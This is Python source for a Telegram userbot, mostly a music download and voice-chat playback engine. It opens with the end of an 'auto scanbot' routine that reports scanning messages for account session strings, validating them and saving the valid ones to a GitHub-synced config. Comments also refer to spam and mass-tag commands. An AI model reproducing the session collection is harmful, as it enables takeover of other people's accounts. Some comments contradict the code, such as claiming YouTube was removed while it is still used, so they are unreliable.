                    "<blockquote>🤖 <b>AUTO SCANBOT</b> — Validating\n\n"
                    f"📨 Messages scanned: <code>{msgs_scanned}</code>\n"
                    f"🔑 Total sessions: <code>{total}</code>\n"
                    f"✔️ Checked: <code>{checked}/{total}</code>\n\n"
                    f"✅ Valid (saved so far): <code>{valid_count}</code>\n"
                    f"❌ Expired: <code>{expired_count}</code>\n"
                    f"♻️ Already saved: <code>{already_count}</code></blockquote>",
                    parse_mode='html'
                )
            except Exception:
                pass

    # ── Save config (GitHub-backed) ───────────────────────────────────────────
    save_config(cfg)
    bot_logger("SCANBOT_AUTO",
        f"Done — {msgs_scanned} msgs scanned, {total} sessions, "
        f"{valid_count} saved, {expired_count} expired, {already_count} already had.")

    # ── Final summary to owner ────────────────────────────────────────────────
    try:
        await prog_msg.edit(
            "<blockquote>✅ <b>AUTO SCANBOT COMPLETE</b>\n\n"
            f"📨 Messages scanned: <code>{msgs_scanned}</code>\n"
            f"🔑 Total sessions found: <code>{total}</code>\n\n"
            f"✅ <b>Valid (saved):</b>    <code>{valid_count}</code>\n"
            f"♻️ <b>Already saved:</b>   <code>{already_count}</code>\n"
            f"❌ <b>Expired (skipped):</b> <code>{expired_count}</code>\n\n"
            "💾 Config synced to GitHub ✓</blockquote>",
            parse_mode='html'
        )
    except Exception:
        pass


async def verify_privileges(event, client, strict_owner_only=False):
    try:
        me     = await client.get_me()
        my_id  = me.id
        sender = event.sender_id
        owner  = cfg.get("OWNER_ID", 0)
        sudo2  = cfg.get("SUDO_LEVEL_2", [])
        if sender == my_id:
            return True
        if sender == owner:
            # When MASTER_SYNC is OFF each session is isolated — the owner can
            # only command their own account. Extra sessions ignore the owner's
            # messages unless MASTER_SYNC is explicitly enabled.
            if my_id == owner or cfg.get("MASTER_SYNC", False):
                return True
            return False
        if not strict_owner_only and sender in sudo2:
            return True
        return False
    except Exception:
        return False

async def safe_send_and_track(client, chat_id, text, reply_to=None, delay=0.0,
                              silent=False, track=True, formatting_entities=None):
    if delay > 0:
        await asyncio.sleep(delay)
    try:
        me_id  = (await client.get_me()).id
        istate = get_isolated_state(me_id)
        # BUG FIX: FloodWait ab HAMESHA respect hoga — SAFE_MODE ON/OFF se fark nahi.
        # Pehle SAFE_MODE OFF hone pe FloodWait silently `return None` kar deta tha,
        # jis se .ow/.fuck/.spam/.tagall bich mein band ho jaati thi bina koi error ke.
        # Ab: 300s tak ka FloodWait automatically handle hoga, usse bada hua to skip.
        _MAX_FLOOD_WAIT = 300  # 5 minute tak wait karo, usse bada hua to skip karo
        for _attempt in range(5):   # auto-retry up to 5× on FloodWait
            try:
                if formatting_entities:
                    msg = await client.send_message(
                        chat_id, text,
                        reply_to=reply_to,
                        formatting_entities=formatting_entities,
                        parse_mode=None,
                        silent=silent,
                    )
                else:
                    msg = await client.send_message(
                        chat_id, text,
                        reply_to=reply_to,
                        parse_mode='html',
                        silent=silent,
                    )
                break  # sent successfully
            except errors.FloodWaitError as fw:
                if fw.seconds <= _MAX_FLOOD_WAIT:
                    asyncio.create_task(send_module_log(
                        f"⚠️ <b>FloodWait</b>: <code>{fw.seconds}s</code>  Chat: <code>{chat_id}</code>"))
                    await asyncio.sleep(fw.seconds + 2)
                    continue   # retry after waiting
                # FloodWait bahut lamba hai (>5 min) — skip karo
                return None
        else:
            return None        # all 5 attempts failed
        # track=False for ow/fuck/tagall/onetag messages — they should NOT be
        # auto-deleted on .stop because they are target-replies or user-requested tags
        if track:
            istate.sent_unid_msgs.setdefault(chat_id, []).append(msg.id)
        return msg
    except (ValueError, Exception):
        # Swallow unresolvable peer errors (e.g. PeerUser(user_id=6) not in session)
        return None

async def send_msg(client, chat_id, text, silent=False):
    try:
        return await client.send_message(chat_id, text, parse_mode='html', silent=silent)
    except Exception:
        return None

async def wipe_untagged_messages(client, my_id, chat_id):
    istate = get_isolated_state(my_id)
    ids    = istate.sent_unid_msgs.pop(chat_id, [])
    if ids:
        try:
            await client.delete_messages(chat_id, ids)
        except Exception:
            pass

async def resolve_target(client, event, text_args):
    if event.reply_to_msg_id:
        try:
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                return reply.sender_id
        except Exception:
            pass
    if text_args:
        try:
            # If it's a pure number, pass as int so Telethon resolves it as a user ID
            arg = int(text_args) if str(text_args).lstrip('-').isdigit() else text_args
            ent = await client.get_entity(arg)
            return ent.id
        except Exception:
            pass
    return None

# ══════════════════════════════════════════
# MUSIC ENGINE — DOWNLOAD + PLAY
# ══════════════════════════════════════════
_YDL_COMMON = {
    'quiet':            True,
    'no_warnings':      True,
    'nocheckcertificate': True,
    'geo_bypass':       True,
    'socket_timeout':   30,
    'retries':          5,
    'fragment_retries': 5,
    'noplaylist':       True,
    # Racing ~12 sources at once already means several downloads can be
    # in flight together; letting each *individual* download also spawn
    # multiple fragment-fetch threads compounds CPU/GIL pressure and can
    # starve the asyncio loop that keeps the Telegram connection alive
    # (seen as "socket.send() raised exception" / dropped connections on
    # small single-core hosts). Keep each download single-threaded.
    'concurrent_fragment_downloads': 1,
    # Heroku apt buildpack puts ffmpeg/ffprobe in /app/.apt/usr/bin —
    # set the explicit path so yt-dlp never falls back to searching PATH.
    **({'ffmpeg_location': os.path.dirname(_FFMPEG_BIN)} if _FFMPEG_BIN else {}),
}

# ══════════════════════════════════════════
# (removed) — the code below this point used to be a YouTube client
# ladder + Piped/Invidious fallback (plus their _get_audio_opts /
# _get_video_opts / _find_downloaded_file helpers). YouTube has been
# fully removed from this bot; music_sources.py's no-login source list
# and unified `resolve_link()` replace all of it.
# ══════════════════════════════════════════

async def search_and_download_audio(query: str):
    if not YTDLP_AVAILABLE:
        return None

    # 0) Stream cache — same song requested before and the file is still on
    #    disk, skip the whole search/download pipeline. (Zero-disk tracks
    #    are never written here — their remote URLs are often short-lived
    #    signed links, so they're re-resolved fresh every time instead.)
    cached = _stream_cache.get(query)
    if cached:
        bot_logger("MUSIC_CACHE_HIT", f"Reusing cached file for: {query}")
        return MusicTrack(
            title=cached["title"], file_path=cached["file_path"],
            duration=cached["duration"], is_video=cached["is_video"],
            thumbnail=cached.get("thumbnail"), source=cached["source"],
        )

    # 0.5) Zero-disk fast path (jugad #1/#2/#4/#5/#6/#10) — try to get a
    #      directly-playable remote URL with no local file at all.
    #      SKIPPED when YTDLP_COOKIES is set: cookies make YouTube the
    #      fastest and most reliable source, so we go straight to YouTube
    #      (step 1.5 below) without wasting time on Piped/Invidious/JioSaavn
    #      zero-disk sources that are slower and rate-limited.
    _has_yt_cookies = bool(os.environ.get("YTDLP_COOKIES", "").strip())
    if not _has_yt_cookies and (not music_sources.is_url(query) or music_sources.is_direct_media_url(query)):
        allow_live = bool(re.search(r"(?i)\blive\b|\breaction\b|\bloop\b", query))
        try:
            zd = await asyncio.wait_for(
                music_sources.resolve_zero_disk_stream(query, logger=bot_logger, allow_live=allow_live),
                timeout=12.0,
            )
        except asyncio.TimeoutError:
            zd = None
            bot_logger("MUSIC_ZERO_DISK_TIMEOUT", f"Zero-disk sources timed out (12s) for: {query!r}")
        if zd and zd.get("stream_url"):
            return MusicTrack(
                title=zd["title"], file_path=None, stream_url=zd["stream_url"],
                duration=zd.get("duration", 0), is_video=False,
                thumbnail=zd.get("thumbnail"), source=zd["source"],
            )

    # 1) Any pasted URL — YouTube links go through youtube_search_download
    #    (cookies path), everything else goes through resolve_link.
    if music_sources.is_url(query):
        if music_sources.is_youtube_url(query):
            ets_yturl = int(time.time() * 1000)
            yt_url_tmpl = os.path.join(MUSIC_CACHE, f"audio_{ets_yturl}_yturl.%(ext)s")
            try:
                yt_url_result = await asyncio.wait_for(
                    music_sources.youtube_search_download(query, yt_url_tmpl, logger=bot_logger),
                    timeout=90.0,
                )
            except asyncio.TimeoutError:
                yt_url_result = None
                bot_logger("MUSIC_YT_TIMEOUT", f"YouTube URL download timed out for: {query!r}")
            if yt_url_result:
                track = MusicTrack(
                    title=yt_url_result["title"], file_path=yt_url_result["file_path"],
                    duration=yt_url_result["duration"], is_video=False,
                    thumbnail=yt_url_result.get("thumbnail"), source=yt_url_result["source"],
                )
                _stream_cache.put(query, track.title, track.file_path, track.duration,
                                   False, track.thumbnail, track.source)
                return track
            return None
        ts       = int(time.time() * 1000)
        out_tmpl = os.path.join(MUSIC_CACHE, f"direct_{ts}.%(ext)s")
        resolved = await music_sources.resolve_link(
            query, out_tmpl, _YDL_COMMON, logger=bot_logger, want_video=False)
        if resolved and not resolved.get("error"):
            track = MusicTrack(
                title=resolved["title"], file_path=resolved["file_path"],
                duration=resolved["duration"], is_video=False,
                thumbnail=resolved.get("thumbnail"), source=resolved["source"],
            )
            _stream_cache.put(query, track.title, track.file_path, track.duration,
                               False, track.thumbnail, track.source)
            return track
        # fall through to the text-search race below only if the link
        # didn't resolve at all (dead link, geo-block, unsupported host).

    # 1.5) YouTube pre-check — runs FIRST when cookies are active (primary path),
    #      or as a parallel race entrant when no cookies.
    #      BUG FIX: old 30s timeout cut off the client ladder mid-way.
    #      With check_formats=False + webm-first format chain, each bad-client
    #      attempt fails fast (≤15s socket_timeout) so the full ladder can
    #      complete. Raise ceiling to 90s (cookies) / 45s (no cookies).
    if not music_sources.is_url(query):
        ets_yt   = int(time.time() * 1000)
        yt_tmpl  = os.path.join(MUSIC_CACHE, f"audio_{ets_yt}_yt.%(ext)s")
        _yt_timeout = 90.0 if _has_yt_cookies else 45.0
        _yt_timeout_label = f"{int(_yt_timeout)}s"
        try:
            yt_result = await asyncio.wait_for(
                music_sources.youtube_search_download(query, yt_tmpl, logger=bot_logger),
                timeout=_yt_timeout,
            )
        except asyncio.TimeoutError:
            yt_result = None
            bot_logger("MUSIC_YT_TIMEOUT", f"YouTube pre-check timed out ({_yt_timeout_label}) for: {query!r}")
        if yt_result:
            track = MusicTrack(
                title=yt_result["title"], file_path=yt_result["file_path"],
                duration=yt_result["duration"], is_video=False,
                thumbnail=yt_result.get("thumbnail"), source=yt_result["source"],
            )
            _stream_cache.put(query, track.title, track.file_path, track.duration,
                               False, track.thumbnail, track.source)
            return track

    track = await _search_and_download_audio_core(query)
    if track:
        _stream_cache.put(query, track.title, track.file_path, track.duration,
                           track.is_video, track.thumbnail, track.source)
        return track

    # 2) Everything above failed. Clean up a messy query via the public,
    #    key-free iTunes metadata search (mirrors the
    #    Spotify/Apple/Deezer "metadata search -> alternate source match"
    #    step from the fallback spec) and retry once with the cleaned title.
    refined = await music_sources.refine_query_via_itunes(query, logger=bot_logger)
    if refined and music_sources.normalize_query(refined) != music_sources.normalize_query(query):
        bot_logger("MUSIC_REFINE", f"Retrying with refined query: {refined}")
        track = await _search_and_download_audio_core(refined)
        if track:
            _stream_cache.put(query, track.title, track.file_path, track.duration,
                               track.is_video, track.thumbnail, track.source)
            return track

    # 3) Last-resort retry. Every free source above is a public scraping
    #    target — a transient network blip, a momentary 429/rate-limit, or
    #    a slow DNS lookup on ONE attempt is common and unrelated to whether
    #    the song actually exists. This is the other half of "sometimes
    #    plays, sometimes doesn't": the exact same query can fail once and
    #    succeed a few seconds later with zero code changes. Give the whole
    #    pipeline one more shot after a short backoff before giving up.
    await asyncio.sleep(1.5)
    bot_logger("MUSIC_RETRY", f"All sources failed once — retrying query: {query!r}")
    track = await _search_and_download_audio_core(query)
    if track:
        _stream_cache.put(query, track.title, track.file_path, track.duration,
                           track.is_video, track.thumbnail, track.source)
        return track
    return None


async def _search_and_download_audio_core(query: str):
    """Race YouTube (primary, with cookies) and Piped (backup) in parallel.

    YouTube is the primary source — cookies give full DASH manifests and
    reliable format selection. Piped is the fallback via open-source YouTube
    frontends that extract on their own servers, bypassing datacenter IP blocks.

    Returns the first valid MusicTrack, or None if both fail.
    """
    ets = int(time.time() * 1000)   # source timestamp (avoids filename clashes)

    # Hard per-source ceiling. Without this, one slow/hanging source (a
    # scraper site that accepts the connection but never responds, a DNS
    # lookup that never resolves, etc.) keeps its task in `pending` forever
    # — the `while pending` race loop below then never finishes, so the
    # bot just sits on "Searching..." forever, even though 12 other
    # sources already failed. Every source gets a fixed timeout so its
    # task ALWAYS completes (with a real result or None), which guarantees
    # the overall race loop always terminates.
    _SOURCE_TIMEOUT = 20

    async def _extra_src(name, coro, delay=0.0):
        """Wrap a music_sources coroutine; convert its dict -> MusicTrack.
        `delay` implements the soft priority stagger described above."""
        try:
            if delay:
                await asyncio.sleep(delay)
            result = await asyncio.wait_for(coro, timeout=_SOURCE_TIMEOUT)
            if not result:
                return None
            return MusicTrack(
                title=result["title"],
                file_path=result["file_path"],
                duration=result["duration"],
                is_video=False,
                thumbnail=result.get("thumbnail"),
                source=result["source"],
            )
        except Exception as e:
            bot_logger("MUSIC_DL_ERR", f"[extra] {name}: {e}")
            return None

    # ── all sources, ordered by stated priority; low-priority ones get a
    #    small head-start penalty so ties lean toward the preferred source
    #    without turning this into a strict, slow waterfall ─────────────
    # Sources: YouTube (primary, with cookies) + Piped (backup via Piped frontend).
    # All other sources removed — YouTube with cookies is the sole music source.
    sources = [
        # YouTube: primary — authenticated via cookies, full DASH manifest.
        ("youtube", music_sources.youtube_search_download(
            query, os.path.join(MUSIC_CACHE, f"audio_{ets}_yt2.%(ext)s"),
            bot_logger), 0.0),
        # Piped: backup — extraction on Piped servers, bypasses datacenter IP blocks.
        ("piped", music_sources.piped_search_download(
            query, os.path.join(MUSIC_CACHE, f"audio_{ets}_pd.%(ext)s"),
            bot_logger), 0.0),
    ]

    # ── parallel race ────────────────────────────────────────────────────
    async def _safe(name, coro):
        try:
            return await coro
        except asyncio.CancelledError:
            return None
        except Exception as exc:
            bot_logger("MUSIC_DL_ERR", f"[race] {name}: {exc}")
            return None

    tasks   = {asyncio.create_task(_safe(name, _extra_src(name, coro, delay))): name
               for name, coro, delay in sources}
    pending = set(tasks)
    winner  = None

    while pending:
        done, pending = await asyncio.wait(
            pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                result = task.result()
            except Exception:
                result = None
            if result is not None and winner is None:
                winner = result
                bot_logger("MUSIC_DL",
                           f"Winner: {tasks[task]} → {result.title!r}")
                for p in pending:
                    p.cancel()
                if pending:
                    await asyncio.gather(*pending, return_exceptions=True)
                pending = set()
                break

    return winner


async def search_and_download_video(query: str):
    if not YTDLP_AVAILABLE:
        return None

    cached = _stream_cache.get(f"video::{query}")
    if cached:
        bot_logger("MUSIC_CACHE_HIT", f"Reusing cached video for: {query}")
        return MusicTrack(
            title=cached["title"], file_path=cached["file_path"],
            duration=cached["duration"], is_video=True,
            thumbnail=cached.get("thumbnail"), source=cached["source"],
        )

    # Any pasted URL — YouTube links go through youtube_video_download,
    # everything else (direct mp4, m3u8/HLS, etc.) through resolve_link.
    if music_sources.is_url(query):
        if music_sources.is_youtube_url(query):
            ets_yturl = int(time.time() * 1000)
            ytv_url_tmpl = os.path.join(MUSIC_CACHE, f"video_{ets_yturl}_yturl.%(ext)s")
            ytv_url_result = await music_sources.youtube_video_download(
                query, ytv_url_tmpl, logger=bot_logger)
            if ytv_url_result:
                track = MusicTrack(
                    title=ytv_url_result["title"], file_path=ytv_url_result["file_path"],
                    duration=ytv_url_result["duration"], is_video=True,
                    thumbnail=ytv_url_result.get("thumbnail"), source=ytv_url_result["source"],
                )
                _stream_cache.put(f"video::{query}", track.title, track.file_path,
                                   track.duration, True, track.thumbnail, track.source)
                return track
            return None
        ts       = int(time.time() * 1000)
        out_tmpl = os.path.join(MUSIC_CACHE, f"video_{ts}.%(ext)s")
        resolved = await music_sources.resolve_link(
            query, out_tmpl, _YDL_COMMON, logger=bot_logger, want_video=True)
        if resolved and not resolved.get("error"):
            track = MusicTrack(
                title=resolved["title"], file_path=resolved["file_path"],
                duration=resolved["duration"], is_video=True,
                thumbnail=resolved.get("thumbnail"), source=resolved["source"],
            )
            _stream_cache.put(f"video::{query}", track.title, track.file_path,
                               track.duration, True, track.thumbnail, track.source)
            return track

    # 1.5) Try YouTube video first
    if not music_sources.is_url(query):
        ets_ytv   = int(time.time() * 1000)
        ytv_tmpl  = os.path.join(MUSIC_CACHE, f"video_{ets_ytv}_yt.%(ext)s")
        ytv_result = await music_sources.youtube_video_download(query, ytv_tmpl, logger=bot_logger)
        if ytv_result:
            track = MusicTrack(
                title=ytv_result["title"], file_path=ytv_result["file_path"],
                duration=ytv_result["duration"], is_video=True,
                thumbnail=ytv_result.get("thumbnail"), source=ytv_result["source"],
            )
            _stream_cache.put(f"video::{query}", track.title, track.file_path,
                               track.duration, True, track.thumbnail, track.source)
            return track

    track = await _search_and_download_video_core(query)
    if track:
        _stream_cache.put(f"video::{query}", track.title, track.file_path,
                           track.duration, True, track.thumbnail, track.source)
        return track

    refined = await music_sources.refine_query_via_itunes(query, logger=bot_logger)
    if refined and music_sources.normalize_query(refined) != music_sources.normalize_query(query):
        bot_logger("MUSIC_REFINE", f"Retrying video with refined query: {refined}")
        track = await _search_and_download_video_core(refined)
        if track:
            _stream_cache.put(f"video::{query}", track.title, track.file_path,
                               track.duration, True, track.thumbnail, track.source)
            return track
    return None


async def _search_and_download_video_core(query: str):
    """Text-query video search with YouTube removed. There is no equally
    strong free/no-login general video-search API to replace it with, so
    this searches Internet Archive's public video library (movies, TV,
    educational/public-domain clips) as the best-effort text-search path.
    For anything else, users should reply to a video message (handled by
    download_tagged_media) or paste a direct video link (handled above in
    search_and_download_video via resolve_link)."""
    ts       = int(time.time() * 1000)
    out_tmpl = os.path.join(MUSIC_CACHE, f"video_{ts}_ia.%(ext)s")
    result = await music_sources.archive_org_video_search_download(
        query, out_tmpl, logger=bot_logger)
    if not result:
        return None
    return MusicTrack(
        title=result["title"],
        file_path=result["file_path"],
        duration=result["duration"],
        is_video=True,
        thumbnail=result.get("thumbnail"),
        source=result["source"],
    )



async def download_tagged_media(event):
    """Download a replied-to audio or video message."""
    try:
        replied = await event.get_reply_message()
    except Exception:
        return None
    if not replied or not replied.media:
        return None
    media     = replied.media
    is_video  = False
    title     = "Tagged Media"
    duration  = 0
    if hasattr(media, 'document'):
        doc = media.document
        for attr in doc.attributes:
            if hasattr(attr, 'title') and attr.title:
                title = attr.title
            if hasattr(attr, 'duration') and attr.duration:
                duration = int(attr.duration)
            if hasattr(attr, 'video') and attr.video:
                is_video = True
        mime = getattr(doc, 'mime_type', '')
        if 'video' in mime:
            is_video = True
        ext   = 'mp4' if is_video else 'mp3'
        fname = f"tagged_{int(time.time() * 1000)}.{ext}"
        fpath = os.path.join(MUSIC_CACHE, fname)
        try:
            dl_path = await replied.download_media(file=fpath)
            if dl_path and os.path.exists(dl_path):
                fpath = dl_path
            return MusicTrack(title=title, file_path=fpath, duration=duration,
                              is_video=is_video, source="file")
        except Exception as e:
            bot_logger("MUSIC_TAG_DL_ERR", str(e))
            return None
    return None

async def _try_create_group_call(chat_id: int, session_user_id: int) -> bool:
    """The group has no active voice/video chat at all — pytgcalls can only
    JOIN an existing one, not conjure one out of thin air. If the userbot
    account has rights to start a voice chat in this chat, create it via
    the raw MTProto call Telegram's own "Start voice chat" button uses,
    then hand off to pytgcalls to join the call we just created."""
    pyro = _get_session_pyro(session_user_id)
    if not pyro:
        return False
    try:
        from pyrogram.raw import functions as _raw_functions
        peer = await pyro.resolve_peer(chat_id)
        await pyro.invoke(
            _raw_functions.phone.CreateGroupCall(
                peer=peer,
                random_id=random.randint(1, 2 ** 31 - 1),
            )
        )
        await asyncio.sleep(1.0)  # give Telegram a moment to register the call
        return True
    except Exception as e:
        err_str = str(e)
        # CALL_ALREADY_EXISTS  → voice chat already running, pytgcalls can join it.
        # CREATE_CALL_FAILED   → transient Telegram error; return True so
        #                        pytgcalls.play(auto_start=True) retries itself.
        if "CALL_ALREADY_EXISTS" in err_str or "CREATE_CALL_FAILED" in err_str:
            await asyncio.sleep(0.5)
            return True
        bot_logger("MUSIC_PLAY_ERR", f"Could not auto-start voice chat: {e}")
        return False


async def music_play_track(chat_id: int, track: MusicTrack, session_user_id: int,
                           _retry: bool = True, _attempt: int = 0):
    """Starts streaming `track` into the chat's voice call using the
    PyTgCalls instance belonging to `session_user_id` (per-account music —
    each userbot plays through its own Pyrogram session).
    Returns (True, None) on success, or (False, reason) on failure where
    reason is one of: "not_admin", "no_call", "generic".

    _attempt tracks which fallback strategy we're on (0-4):
      0 — Normal play
      1 — ProcessLookupError → reset state + rebuild PyTgCalls
      2 — ProcessLookupError again → force leave + rebuild + backoff
      3 — Generic failure → force disk download
      4 — Last resort → fresh re-download (bypass file cache)
    """
    mstate = get_music_state(chat_id)
    tgcalls = _get_session_pytgcalls(session_user_id)
    if not PYTGCALLS_AVAILABLE or not tgcalls:
        return False, "generic"
    source = track.playback_source()
    if not source:
        bot_logger("MUSIC_PLAY_ERR", "No playable source (no file_path/stream_url) on track.")
        return False, "generic"
    # Only local disk paths need an existence check — a zero-disk track's
    # `stream_url` is a remote URL that ffmpeg will open directly, so
    # os.path.exists() would (correctly) always return False for it and
    # must not be treated as a failure.
    if not track.is_zero_disk() and not os.path.exists(source):
        bot_logger("MUSIC_PLAY_ERR", f"File not found: {source}")
        return False, "generic"
    try:
        # Low-latency network jugad: reconnect on drops, don't wait around
        # probing the stream before playing — matters most for zero-disk
        # tracks streamed live from a remote CDN, but harmless (ffmpeg
        # ignores network-only flags) for local files too.
        # Zero-disk streams need more probesize/analyzeduration so ffmpeg can
        # correctly detect the container format (HLS, progressive MP3, OPUS,
        # etc.) coming from CDNs like SoundCloud, JioSaavn, Piped.  Too low
        # a value causes immediate format detection failures, which show up
        # as empty-string exceptions from PyTgCalls.
        if track.is_zero_disk():
            _ffmpeg_in_flags = (
                "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 "
                "-probesize 5000000 -analyzeduration 5000000 "
                "-headers 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\\r\\n'"
            )
        else:
            _ffmpeg_in_flags = (
                "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 "
                "-probesize 32 -analyzeduration 0"
            )
        if track.is_video:
            stream = MediaStream(
                source,
                audio_parameters=AudioQuality.STUDIO,
                video_parameters=VideoQuality.FHD_1080p,
                ffmpeg_parameters=_ffmpeg_in_flags,
            )
        else:
            # Audio-only tracks still carry a (small, static) video frame in
            # some players — keep it modest since there's nothing to see,
            # but push audio to studio quality since that's all that matters.
            # AudioQuality.STUDIO already drives PyTgCalls' own internal
            # 48kHz Opus WebRTC encoder — forcing ffmpeg to ALSO re-encode
            # its output to an Opus container (as the original brief's
            # `-acodec libopus -f opus` flags would) would corrupt the raw
            # PCM pipe PyTgCalls expects between ffmpeg and its own encoder,
            # producing silent/garbled audio. STUDIO quality is the correct
            # equivalent for this pipeline.
            stream = MediaStream(
                source,
                audio_parameters=AudioQuality.STUDIO,
                video_parameters=VideoQuality.SD_360p,
                ffmpeg_parameters=_ffmpeg_in_flags,
            )
        # ── Silence-frame injection (skip-mode only) ─────────────────────
        # Priming with a silent frame helps when SWAPPING an existing live
        # stream (e.g. .skip) — it signals the VC pipeline to swap cleanly.
        # For FRESH starts (is_playing=False) we skip it: the silence frame
        # spawns a tiny ffmpeg process that finishes in < 0.5s on its own,
        # and when the real play() arrives PyTgCalls tries to kill that
        # already-dead PID → ProcessLookupError.  No existing stream means
        # no need to prime — the first real play() settles fine on its own.
        if mstate.is_playing:
            try:
                await tgcalls.play(chat_id, MediaStream(
                    music_sources.SILENCE_FRAME_PATH,
                    audio_parameters=AudioQuality.STUDIO,
                ))
                await asyncio.sleep(0.4)
            except Exception:
                pass  # best-effort priming — never block real playback

        # play() also works if a stream is already active for this chat —
        # it swaps the running stream in place, which is what .skip relies on.
        # PyTgCalls' own GroupCallConfig(auto_start=True) — the default we
        # rely on here — already tries to create the group call itself if
        # none exists, so this call alone covers the common "no voice chat
        # yet" case without us needing to pre-create it.
        await tgcalls.play(chat_id, stream)
        track.started_at  = time.time()
        track.paused_at   = None
        mstate.current    = track
        mstate.is_playing = True
        mstate.is_paused  = False
        mstate.last_error = None
        mstate.owner_uid  = session_user_id
        return True, None
    except ChatAdminRequired:
        # PyTgCalls tried to auto-start the voice chat but Telegram refused —
        # the userbot account isn't an admin with "Manage video chats" in
        # this group. Retrying (reconnect or manual create) can't fix a
        # permissions problem, so fail fast with an accurate reason.
        bot_logger("MUSIC_PLAY_ERR", f"Not admin in {chat_id} — cannot start voice chat.")
        return False, "not_admin"
    except NoActiveGroupCall:
        # Rare fallback path: auto_start didn't create the call (e.g. an
        # older PyTgCalls build, or auto_start disabled). Try the manual
        # raw-MTProto CreateGroupCall ourselves and retry playback once.
        bot_logger("MUSIC_PLAY_ERR", f"No active group call in {chat_id} — attempting to start one.")
        if _retry and await _try_create_group_call(chat_id, session_user_id):
            return await music_play_track(chat_id, track, session_user_id, _retry=False)
        bot_logger("MUSIC_PLAY_ERR",
                   f"Could not start a voice chat in {chat_id}. The userbot account needs to "
                   "either already be in the voice chat, or have admin rights to start one.")
        return False, "no_call"
    except ProcessLookupError:
        # ── Strategy 1 & 2: Dead ffmpeg PID ──────────────────────────────
        # Root cause: mstate.is_playing was True (stale state) → silence
        # frame got injected → silence frame process finished on its own in
        # < 0.5s → real play() tried to kill that already-dead PID → error.
        # Fix: (a) reset mstate so silence frame is NOT injected on retry,
        #      (b) rebuild PyTgCalls to clear all stale process handles.
        bot_logger("MUSIC_PLAY_ERR",
                   f"ProcessLookupError() [attempt {_attempt}] — rebuilding PyTgCalls.")
        # Clear stale state so silence frame is NOT injected on retry
        mstate.is_playing = False
        mstate.is_paused  = False
        if _attempt >= 3:
            bot_logger("MUSIC_PLAY_ERR", "Max retries reached — giving up.")
            return False, "generic"
        # Leave the call before rebuild to clear stale VC state
        try:
            await tgcalls.leave_call(chat_id)
        except Exception:
            pass
        # Minimal backoff — fast recovery is the goal (was 2s/4s/6s, now 0.3s)
        await asyncio.sleep(0.3)
        try:
            pyro_client = pyro_apps.get(session_user_id)
            if pyro_client and PYTGCALLS_AVAILABLE:
                # On attempt >= 1, also reconnect the Pyrogram client
                if _attempt >= 1:
                    try:
                        await pyro_client.disconnect()
                    except Exception:
                        pass
                    await asyncio.sleep(0.3)
                    try:
                        await pyro_client.connect()
                    except Exception:
                        pass
                    await asyncio.sleep(0.3)
                new_tc = PyTgCalls(pyro_client)
                pytgcalls_apps[session_user_id] = new_tc
                if session_user_id == cfg.get("OWNER_ID", 0):
                    global pytgcalls_app
                    pytgcalls_app = new_tc
                await new_tc.start()
                await asyncio.sleep(0.5)   # minimal NTgCalls stabilise (was 2.0s)
                register_stream_end_handler(session_user_id)
                bot_logger("MUSIC_PLAY_ERR",
                           f"PyTgCalls rebuilt [attempt {_attempt}] ✅ — retrying play.")
            else:
                return False, "generic"
        except Exception as _reinit_err:
            bot_logger("MUSIC_PLAY_ERR", f"PyTgCalls rebuild failed: {_reinit_err}")
            return False, "generic"
        # No extra backoff — retry immediately
        return await music_play_track(chat_id, track, session_user_id,
                                      _retry=_retry, _attempt=_attempt + 1)
    except Exception as e:
        # Always log the exception TYPE alongside the message — PyTgCalls often
        # throws exceptions whose str() is empty (""), making bare str(e) logs
        # useless.  repr(e) gives "ExceptionClass('msg')" which is always visible.
        err_repr = repr(e) if repr(e) != repr(Exception()) else f"{type(e).__name__}(no message)"
        msg = str(e).upper()
        if "ADMIN" in msg and "REQUIRED" in msg:
            bot_logger("MUSIC_PLAY_ERR", f"Not admin in {chat_id}: {err_repr}")
            return False, "not_admin"
        if "GROUPCALL_ALREADY_STARTED" in msg or ("ALREADY" in msg and "CALL" in msg):
            if _attempt < 4:
                return await music_play_track(chat_id, track, session_user_id,
                                              _retry=False, _attempt=_attempt + 1)
        bot_logger("MUSIC_PLAY_ERR", f"[attempt {_attempt}] {err_repr}")

        # ── Strategy 3: Zero-disk URL failed → force disk download ────────
        if track.is_zero_disk() and _attempt < 3:
            bot_logger("MUSIC_PLAY_ERR",
                       f"Zero-disk URL failed ({err_repr[:60]}) — falling back to disk download.")
            try:
                disk_track = await asyncio.wait_for(
                    _search_and_download_audio_core(track.title), timeout=30.0)
            except (asyncio.TimeoutError, Exception) as _dl_err:
                disk_track = None
                bot_logger("MUSIC_PLAY_ERR", f"Disk fallback failed: {_dl_err}")
            if disk_track:
                bot_logger("MUSIC_DL", f"Strategy 3 fallback: disk track via {disk_track.source}")
                disk_track.requester = track.requester
                return await music_play_track(chat_id, disk_track, session_user_id,
                                              _retry=True, _attempt=3)
            # Fall through to reconnect strategy

        # ── Strategy 4: Leave stale call + reconnect ──────────────────────
        if _attempt < 3 and _retry:
            bot_logger("MUSIC_PLAY_ERR", "Strategy 4: leaving call + reconnect retry.")
            try:
                await tgcalls.leave_call(chat_id)
            except Exception:
                pass
            await asyncio.sleep(1.5)
            return await music_play_track(chat_id, track, session_user_id,
                                          _retry=False, _attempt=_attempt + 1)

        # ── Strategy 5: Last resort — fresh re-download (ignore disk cache) ─
        if _attempt < 4 and not track.is_zero_disk() and track.file_path:
            bot_logger("MUSIC_PLAY_ERR", "Strategy 5: fresh re-download (bypassing cache).")
            try:
                fresh_track = await asyncio.wait_for(
                    _search_and_download_audio_core(track.title), timeout=40.0)
            except (asyncio.TimeoutError, Exception) as _fe:
                fresh_track = None
                bot_logger("MUSIC_PLAY_ERR", f"Fresh download failed: {_fe}")
            if fresh_track and fresh_track.file_path != track.file_path:
                fresh_track.requester = track.requester
                return await music_play_track(chat_id, fresh_track, session_user_id,
                                              _retry=True, _attempt=4)

        return False, "generic"
    finally:
        # RAM/ghost-process prevention (jugad #8): every play() attempt spins
        # up/tears down ffmpeg subprocesses under the hood. Force a GC pass
        # so dead ffmpeg process handles and buffers get reclaimed instead
        # of piling up across many .play / .skip calls on a low-RAM dyno.
